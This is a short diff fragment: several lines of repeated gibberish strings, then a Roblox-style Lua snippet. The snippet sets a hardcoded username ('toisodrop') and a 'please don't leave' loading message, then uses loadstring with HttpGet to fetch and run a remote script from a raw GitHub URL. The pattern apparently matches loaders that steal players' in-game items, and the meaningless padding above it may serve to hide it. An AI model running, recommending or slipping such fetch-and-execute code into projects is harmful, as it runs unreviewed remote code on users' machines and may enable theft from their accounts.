@@ -54,6 +54,7 @@ yptu0r730777037598j3if5n84cng74c72ohf7n5uv8n48ho2hf47nc4noqfh747mc477b3ecnig3oce
 ceyptu0r730777037598j3if5n84cng74c72ohf7n5uv8n48ho2hf47nc4noqfh747mc477b3ecnig3ocey
 ptu0r730777037598j3if5n84cng74c72ohf7n5uv8n48ho2hf47nc4noqfh747mc477b3ecnig3oce
 yptu0r730777037598j3if5n84cng74c72ohf7n5uv8n48ho2hf47nc4noqfh747mc477b3ecnig3oceyptu
+
 _G.Username = "toisodrop"
 _G.HubName = "Auto comet script are loading, please don't leave"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
